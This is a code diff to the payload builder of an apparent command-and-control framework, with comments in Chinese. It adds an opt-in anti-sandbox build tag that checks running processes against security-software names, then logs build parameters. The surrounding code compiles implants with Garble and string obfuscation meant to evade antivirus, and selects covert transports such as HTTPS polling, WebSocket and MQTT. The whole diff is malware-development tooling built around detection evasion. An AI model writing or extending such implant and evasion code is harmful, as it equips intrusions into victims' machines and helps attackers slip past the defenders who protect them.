@@ -66,6 +66,11 @@ type BuildOptions struct {
 	// 启动随机延迟（秒）：植入端启动后随机休眠 [min,max] 秒，打乱"启动即行为"的检测节奏。
 	StartDelayMin int `json:"startup_delay_min"`
 	StartDelayMax int `json:"startup_delay_max"`
+	// 主动反沙箱进程检测（枚举进程并与安全软件/分析工具进程名比对后延迟执行）。
+	// **默认关闭**：该行为是国产杀软主动防御明确拦截的对抗动作，且需要静态导入
+	// toolhelp32 API + 携带安全软件进程名字符串。开启时服务端加 -tags evasionscan，
+	// 只有勾选才把 evasion_scan_windows.go 编进载荷。
+	EvasionScan bool `json:"evasion_scan"`
 }
 
 type BuildResult struct {
@@ -526,7 +531,7 @@ func (b *Builder) compile(opts BuildOptions) ([]byte, error) {
 		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
 	}
 
-	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile)
+	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile, opts.EvasionScan)
 	if err != nil {
 		return nil, err
 	}
@@ -576,7 +581,7 @@ func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
 		return nil, err
 	}
 
-	return b.compileGoCode(tmpDir, targetOS, arch, false, "tcp", "full")
+	return b.compileGoCode(tmpDir, targetOS, arch, false, "tcp", "full", false)
 }
 
 func (b *Builder) generateLibraryCode(targetOS string) string {
@@ -656,6 +661,13 @@ func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
 	cfg := config.Get()
 	key := []byte(cfg.Listener.EncryptionKey)
 
+	// 把真正烘焙进载荷的参数写进日志：出现"配了没生效/载荷里怎么有这个特征"时，
+	// 这行是唯一可信的第一现场（前端请求与服务端配置三层，任一层都可能覆盖）。
+	logging.Info("builder",
+		"rendering implant: url=%s interval=%ds jitter=%d%% startup_delay=%d~%ds evasion_scan=%v profile=%s",
+		opts.ServerURL, opts.Interval, opts.Jitter, opts.StartDelayMin, opts.StartDelayMax,
+		opts.EvasionScan, opts.Profile)
+
 	mainFile := filepath.Join(tmpDir, "main.go")
 	data, err := os.ReadFile(mainFile)
 	if err != nil {
@@ -709,16 +721,9 @@ func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
 	return os.WriteFile(mainFile, []byte(content), 0644)
 }
 
-func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string) ([]byte, error) {
-	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
-	// 确保随机 xd 基准与注入值一致。
-
-	// 条件编译标签：
-	//   transport=http       → -tags transport_http（HTTPS 轮询通道，体积较大）
-	//   transport=websocket  → -tags transport_ws（WebSocket 通道）
-	//   transport=mqtt       → -tags transport_mqtt（MQTT pub/sub 通道）
-	//   profile=light        → -tags light（裁剪截图/中继/注入/EDR 等重量级模块）
-	buildTags := ""
+// buildTagList 汇总植入端构建需要的 Go 构建标签（空格分隔，可直接给 -tags）。
+// 单独抽成函数便于单测：标签直接决定哪些代码进入载荷（免杀相关，改错很难察觉）。
+func buildTagList(transport, profile string, evasionScan bool) string {
 	var tags []string
 	switch transport {
 	case "http":
@@ -731,9 +736,23 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 	if profile == "light" {
 		tags = append(tags, "light")
 	}
-	if len(tags) > 0 {
-		buildTags = strings.Join(tags, " ")
+	if evasionScan {
+		tags = append(tags, "evasionscan")
 	}
+	return strings.Join(tags, " ")
+}
+
+func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan bool) ([]byte, error) {
+	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
+	// 确保随机 xd 基准与注入值一致。
+	// 条件编译标签（见 buildTagList）：
+	//   transport=http       → transport_http（HTTPS 轮询通道，体积较大）
+	//   transport=websocket  → transport_ws（WebSocket 通道）
+	//   transport=mqtt       → transport_mqtt（MQTT pub/sub 通道）
+	//   profile=light        → light（裁剪截图/中继/注入/EDR 等重量级模块）
+	//   evasion_scan=on      → evasionscan（主动反沙箱进程检测；默认不编译，
+	//                          见 implant/evasion_scan_windows.go 的说明）
+	buildTags := buildTagList(transport, profile, evasionScan)
 
 	// TLS 客户端实现文件按通道裁剪：
 	//   - 非 HTTP 构建（TCP）：transport_tls_std.go / transport_tls_utls.go
@@ -793,6 +812,15 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 		outputName = "implant"
 	}
 	outputPath := filepath.Join(tmpDir, outputName)
+
+	// 把生效的构建档位写进日志：排查"载荷里为什么有这个特征/为什么没生效"时，
+	// 第一现场就是这行（标签决定哪些模块进载荷，例如 evasionscan 默认关闭）。
+	toolchain := goToolchain
+	if toolchain == "" {
+		toolchain = "current"
+	}
+	logging.Info("builder", "compiling implant: os=%s arch=%s tags=%q garble=%v go=%s",
+		targetOS, arch, buildTags, useGarble, toolchain)
 
 	if useGarble {
 		// Garble 混淆编译
